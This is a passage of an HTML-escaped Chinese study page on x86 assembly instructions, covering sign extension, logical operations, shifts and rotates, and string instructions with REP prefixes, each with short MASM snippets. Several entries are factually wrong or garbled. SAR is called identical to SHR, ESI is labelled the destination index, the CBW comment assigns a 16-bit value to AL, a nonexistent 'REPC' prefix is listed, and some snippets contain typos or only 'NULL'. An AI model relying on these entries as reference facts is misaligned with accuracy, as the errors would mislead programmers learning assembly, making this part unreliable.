mov var2,ah&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;CBW-字节转换为字-把AL中字节的符号扩展到AH中去&#34;&gt;&lt;a href=&#34;#CBW-字节转换为字-把AL中字节的符号扩展到AH中去&#34; class=&#34;headerlink&#34; title=&#34;CBW 字节转换为字. (把AL中字节的符号扩展到AH中去)&#34;&gt;&lt;/a&gt;CBW 字节转换为字. (把AL中字节的符号扩展到AH中去)&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;var sword -101;9Bh
mov al,var;AL=9Bh
cbw;AL=FF9Bh&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;CWD-字转换为双字-把AX中的字的符号扩展到DX中去&#34;&gt;&lt;a href=&#34;#CWD-字转换为双字-把AX中的字的符号扩展到DX中去&#34; class=&#34;headerlink&#34; title=&#34;CWD 字转换为双字. (把AX中的字的符号扩展到DX中去)&#34;&gt;&lt;/a&gt;CWD 字转换为双字. (把AX中的字的符号扩展到DX中去)&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;var sword -101;FF9Bh
mov ax,var;AX=FF9Bh
cwd;DX:AX=FFFFFF9Bh&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;CWDE-字转换为双字-把AX中的字符号扩展到EAX中去&#34;&gt;&lt;a href=&#34;#CWDE-字转换为双字-把AX中的字符号扩展到EAX中去&#34; class=&#34;headerlink&#34; title=&#34;CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去)&#34;&gt;&lt;/a&gt;CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去)&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;NULL&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;CDQ-双字扩展-把EAX中的字的符号扩展到EDX中去&#34;&gt;&lt;a href=&#34;#CDQ-双字扩展-把EAX中的字的符号扩展到EDX中去&#34; class=&#34;headerlink&#34; title=&#34;CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去)&#34;&gt;&lt;/a&gt;CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去)&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-C++&#34; data-language=&#34;C++&#34;&gt;&lt;code class=&#34;language-C++&#34;&gt;var sword -101;FFFFFF9Bh
mov eax,var;EDX:EAX=FFFFFFFFFFFFFF9Bh
cdq&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;逻辑运算指令&#34;&gt;&lt;a href=&#34;#逻辑运算指令&#34; class=&#34;headerlink&#34; title=&#34;逻辑运算指令&#34;&gt;&lt;/a&gt;逻辑运算指令&lt;/h1&gt;&lt;h3 id=&#34;AND-与运算&#34;&gt;&lt;a href=&#34;#AND-与运算&#34; class=&#34;headerlink&#34; title=&#34;AND 与运算&#34;&gt;&lt;/a&gt;AND 与运算&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov al,10101110b
and al,11110110b;消除位0,3&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;OR-或运算&#34;&gt;&lt;a href=&#34;#OR-或运算&#34; class=&#34;headerlink&#34; title=&#34;OR 或运算&#34;&gt;&lt;/a&gt;OR 或运算&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov al,11100011b
or al,00000100b;位2置1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;XOR-异或运算&#34;&gt;&lt;a href=&#34;#XOR-异或运算&#34; class=&#34;headerlink&#34; title=&#34;XOR 异或运算&#34;&gt;&lt;/a&gt;XOR 异或运算&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov al,10110101b
xor al,0;异或&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;NOT-取反&#34;&gt;&lt;a href=&#34;#NOT-取反&#34; class=&#34;headerlink&#34; title=&#34;NOT 取反&#34;&gt;&lt;/a&gt;NOT 取反&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov al,10101110b
not al;补集&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;TEST-测试-两操作数作与运算-仅修改标志位-不回送结果&#34;&gt;&lt;a href=&#34;#TEST-测试-两操作数作与运算-仅修改标志位-不回送结果&#34; class=&#34;headerlink&#34; title=&#34;TEST 测试(两操作数作与运算,仅修改标志位,不回送结果)&#34;&gt;&lt;/a&gt;TEST 测试(两操作数作与运算,仅修改标志位,不回送结果)&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;test al,00001001b;测试0,3位&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;SHL-逻辑左移-位元乘法&#34;&gt;&lt;a href=&#34;#SHL-逻辑左移-位元乘法&#34; class=&#34;headerlink&#34; title=&#34;SHL 逻辑左移,位元乘法&#34;&gt;&lt;/a&gt;SHL 逻辑左移,位元乘法&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov bl,8Fh;BL=10001111b
shl bl,1;CF=1,BL=00011110b&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;SAL-算术左移-SHL&#34;&gt;&lt;a href=&#34;#SAL-算术左移-SHL&#34; class=&#34;headerlink&#34; title=&#34;SAL 算术左移(=SHL)&#34;&gt;&lt;/a&gt;SAL 算术左移(=SHL)&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;sal/shl&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;SHR-逻辑右移，位元除法&#34;&gt;&lt;a href=&#34;#SHR-逻辑右移，位元除法&#34; class=&#34;headerlink&#34; title=&#34;SHR 逻辑右移，位元除法&#34;&gt;&lt;/a&gt;SHR 逻辑右移，位元除法&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov al,0D0h;AL=11010000b
shr al,1;AL=01101000b,CF=0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;SAR-算术右移-SHR&#34;&gt;&lt;a href=&#34;#SAR-算术右移-SHR&#34; class=&#34;headerlink&#34; title=&#34;SAR 算术右移(=SHR)&#34;&gt;&lt;/a&gt;SAR 算术右移(=SHR)&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;sar/shr&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ROL-循环左移&#34;&gt;&lt;a href=&#34;#ROL-循环左移&#34; class=&#34;headerlink&#34; title=&#34;ROL 循环左移&#34;&gt;&lt;/a&gt;ROL 循环左移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-C++&#34; data-language=&#34;C++&#34;&gt;&lt;code class=&#34;language-C++&#34;&gt;mov al,40h;AL=01000000b
rol al,1;AL=10000000b
rol al,3;AL=00000100b&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ROR-循环右移&#34;&gt;&lt;a href=&#34;#ROR-循环右移&#34; class=&#34;headerlink&#34; title=&#34;ROR 循环右移&#34;&gt;&lt;/a&gt;ROR 循环右移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov al,01h;AL=00000001b
ror al,1;AL=10000000b
ror al,3;AL=00010000b&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;RCL-通过进位的循环左移&#34;&gt;&lt;a href=&#34;#RCL-通过进位的循环左移&#34; class=&#34;headerlink&#34; title=&#34;RCL 通过进位的循环左移&#34;&gt;&lt;/a&gt;RCL 通过进位的循环左移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;clc;CF=0
mov bl,88h;CF,BL=0 10001000b
rcl bl,1;CF,BL=1 00010000b
rcl bl,1;CF,BL=0 00100010b&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;RCR-通过进位的循环右移&#34;&gt;&lt;a href=&#34;#RCR-通过进位的循环右移&#34; class=&#34;headerlink&#34; title=&#34;RCR 通过进位的循环右移&#34;&gt;&lt;/a&gt;RCR 通过进位的循环右移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;stc ;CF=1
mov ah,10h;AH,CF=00010000 1
rcr ah,1;AH,CF=10001000 0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;以上八种移位指令,其移位次数可达255次&lt;/p&gt;
&lt;p&gt;移位一次时, 可直接用操作码. 如 SHL AX,1&lt;/p&gt;
&lt;p&gt;移位&amp;gt;1次时, 则由寄存器CL给出移位次数&lt;/p&gt;
&lt;p&gt;如 MOV CL,04 SHL AX,CL&lt;/p&gt;
&lt;h3 id=&#34;SHLD-双精度左移&#34;&gt;&lt;a href=&#34;#SHLD-双精度左移&#34; class=&#34;headerlink&#34; title=&#34;SHLD 双精度左移&#34;&gt;&lt;/a&gt;SHLD 双精度左移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;wval word 9BA6h
mov ax,0AC36h
shld wval,ax,4;wval=BA6Ah,将wval左移4位，并把AX的高4位插入wval的低4位&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;SHRD-双精度右移&#34;&gt;&lt;a href=&#34;#SHRD-双精度右移&#34; class=&#34;headerlink&#34; title=&#34;SHRD 双精度右移&#34;&gt;&lt;/a&gt;SHRD 双精度右移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov ax,234Bh
mov dx,7654h
shrd ax,dx,4;AX右移4位，并把DX的低4位插入AX的高4位&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;串指令&#34;&gt;&lt;a href=&#34;#串指令&#34; class=&#34;headerlink&#34; title=&#34;串指令&#34;&gt;&lt;/a&gt;串指令&lt;/h1&gt;&lt;h3 id=&#34;DS-SI-源串段寄存器-源串变址&#34;&gt;&lt;a href=&#34;#DS-SI-源串段寄存器-源串变址&#34; class=&#34;headerlink&#34; title=&#34;DS:SI 源串段寄存器 :源串变址&#34;&gt;&lt;/a&gt;DS:SI 源串段寄存器 :源串变址&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;NULL&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ESI-目标串段寄存器-目标串变址&#34;&gt;&lt;a href=&#34;#ESI-目标串段寄存器-目标串变址&#34; class=&#34;headerlink&#34; title=&#34;ESI 目标串段寄存器:目标串变址&#34;&gt;&lt;/a&gt;ESI 目标串段寄存器:目标串变址&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;NULL&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;CX-重复次数计数器&#34;&gt;&lt;a href=&#34;#CX-重复次数计数器&#34; class=&#34;headerlink&#34; title=&#34;CX 重复次数计数器&#34;&gt;&lt;/a&gt;CX 重复次数计数器&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;NULL&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;AL-AX-扫描值&#34;&gt;&lt;a href=&#34;#AL-AX-扫描值&#34; class=&#34;headerlink&#34; title=&#34;AL/AX 扫描值&#34;&gt;&lt;/a&gt;AL/AX 扫描值&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;NULL&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;D标志-0表示重复操作中SI和DI应自动增量-1表示应自动减量&#34;&gt;&lt;a href=&#34;#D标志-0表示重复操作中SI和DI应自动增量-1表示应自动减量&#34; class=&#34;headerlink&#34; title=&#34;D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量&#34;&gt;&lt;/a&gt;D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;NULL&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;Z标志-用来控制扫描或比较操作的结束&#34;&gt;&lt;a href=&#34;#Z标志-用来控制扫描或比较操作的结束&#34; class=&#34;headerlink&#34; title=&#34;Z标志 用来控制扫描或比较操作的结束&#34;&gt;&lt;/a&gt;Z标志 用来控制扫描或比较操作的结束&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;NULL&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;MOVS-串传送-MOVSB-传送字符-MOVSW-传送字-MOVSD-传送双字&#34;&gt;&lt;a href=&#34;#MOVS-串传送-MOVSB-传送字符-MOVSW-传送字-MOVSD-传送双字&#34; class=&#34;headerlink&#34; title=&#34;MOVS 串传送   ( MOVSB 传送字符 MOVSW 传送字 MOVSD 传送双字 )&#34;&gt;&lt;/a&gt;MOVS 串传送   ( MOVSB 传送字符 MOVSW 传送字 MOVSD 传送双字 )&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;;传送字符串数据：将ESI寻址的内存数据复制到EDI寻址的内存位置
;复制双字数值
source dword 20 dup(0FFFFFFFh)
target dword 20 dup(?)
.code
cld;方向为正
mov ecx,lengthof source;设置REP计数器
mov esi,offset source;ESI指向source
mov edi,offset target;EDI指向target
rep movsd;复制双字&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;CMPS-串比较-CMPSB-比较字符-CMPSW-比较字&#34;&gt;&lt;a href=&#34;#CMPS-串比较-CMPSB-比较字符-CMPSW-比较字&#34; class=&#34;headerlink&#34; title=&#34;CMPS 串比较   ( CMPSB 比较字符 CMPSW 比较字 )&#34;&gt;&lt;/a&gt;CMPS 串比较   ( CMPSB 比较字符 CMPSW 比较字 )&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;;比较字符串：比较分别由ESI和EDI寻址的内存数据
;比较双字
mov esi OFFSET source
mov edi ,OFFSET target
cld;方向为正向
mov ecx, LENGTHOF source;设置重复计数器
repe cmpsd;相等则重复&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;SCAS-串扫描-把AL或AX的内容与目标串作比较-比较结果反映在标志位&#34;&gt;&lt;a href=&#34;#SCAS-串扫描-把AL或AX的内容与目标串作比较-比较结果反映在标志位&#34; class=&#34;headerlink&#34; title=&#34;SCAS 串扫描    把AL或AX的内容与目标串作比较,比较结果反映在标志位&#34;&gt;&lt;/a&gt;SCAS 串扫描    把AL或AX的内容与目标串作比较,比较结果反映在标志位&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;;扫描字符串：比较累加器（AL、AX和EAX）与EDI寻址的内存数据
;扫描是否有匹配字符
alpha BYTE &#34;ABCDEFGH&#34;,0
.code
mov edi,OFFSET alpha;EDI指向字符串
mov al,&#39;F&#39;;检索字符F
mov ecx,LENGTHOF alpha;设置检索计数器
cld;方向为正向
repne scasb;不相等则重复
jnz quit;若未发现字符则退出
dec edi;发现字符: EDI减1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LODS-装入串-把源串中的元素-字或字节-逐一装入AL或AX中-LODSB-传送字符-LODSW-传送字-LODSD-传送双字&#34;&gt;&lt;a href=&#34;#LODS-装入串-把源串中的元素-字或字节-逐一装入AL或AX中-LODSB-传送字符-LODSW-传送字-LODSD-传送双字&#34; class=&#34;headerlink&#34; title=&#34;LODS 装入串    把源串中的元素(字或字节)逐一装入AL或AX中( LODSB 传送字符 LODSW 传送字 LODSD 传送双字 )&#34;&gt;&lt;/a&gt;LODS 装入串    把源串中的元素(字或字节)逐一装入AL或AX中( LODSB 传送字符 LODSW 传送字 LODSD 传送双字 )&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;;从字符串加载到累加器：将ESI寻址的内存数据加载到累加器
;数组乘法
:本程序将一个32位整数数组中的每个元素都乘以一个常数。
INCLUDE Irvine32. inc
.data
array DWORD 1,2,3,4,5,6,7,8,9,10;测试数据
multiplier DWORD 10;测试数据
.code
main PROC
    cld;方向为正向
    mov esi,OFFSET array;源数组索引
    mov edi,esi;目标数组索引
    mov ecx,LENGTHOF array;循环计数器
Ll: lodsd;将[ESI]加载到EAX
    mul multiplier;与常数相乘
    stosd;将EAX保存到[EDI]
    loop Ll
    exit
main ENDP
END main&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;STOS-保存串-是LODS的逆过程&#34;&gt;&lt;a href=&#34;#STOS-保存串-是LODS的逆过程&#34; class=&#34;headerlink&#34; title=&#34;STOS 保存串   是LODS的逆过程&#34;&gt;&lt;/a&gt;STOS 保存串   是LODS的逆过程&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;;保存字符串数据L：将累加器内容保存到EDI寻址的内存位置
.data
Count = 100
string1 BYTE Count DUP(?)
.code
mov al,OFFh;要保存的数值
mov edi,OFFSET string1;EDI指向目标字符串
mov ecx,Count;字符计数器
cld;方向为正向
rep stosb;用AL的内容实现填充&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;REP-当CX-ECX0时重复-单个指令处理整个字符串&#34;&gt;&lt;a href=&#34;#REP-当CX-ECX0时重复-单个指令处理整个字符串&#34; class=&#34;headerlink&#34; title=&#34;REP 当CX/ECX&lt;&gt;0时重复(单个指令处理整个字符串)&#34;&gt;&lt;/a&gt;REP 当CX/ECX&amp;lt;&amp;gt;0时重复(单个指令处理整个字符串)&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;rep movsb&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;REPE-REPZ-当ZF-1或比较结果相等-且CX-ECX0时重复&#34;&gt;&lt;a href=&#34;#REPE-REPZ-当ZF-1或比较结果相等-且CX-ECX0时重复&#34; class=&#34;headerlink&#34; title=&#34;REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复&#34;&gt;&lt;/a&gt;REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&amp;lt;&amp;gt;0时重复&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;repe cmpsd&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;REPNE-REPNZ-当ZF-0或比较结果不相等-且CX-ECX0时重复&#34;&gt;&lt;a href=&#34;#REPNE-REPNZ-当ZF-0或比较结果不相等-且CX-ECX0时重复&#34; class=&#34;headerlink&#34; title=&#34;REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复&#34;&gt;&lt;/a&gt;REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&amp;lt;&amp;gt;0时重复&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;repne scasb&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;REPC-当CF-1且CX-ECX0时重复&#34;&gt;&lt;a href=&#34;#REPC-当CF-1且CX-ECX0时重复&#34; class=&#34;headerlink&#34; title=&#34;REPC 当CF=1且CX/ECX&lt;&gt;0时重复&#34;&gt;&lt;/a&gt;REPC 当CF=1且CX/ECX&amp;lt;&amp;gt;0时重复&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;repc movsb&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

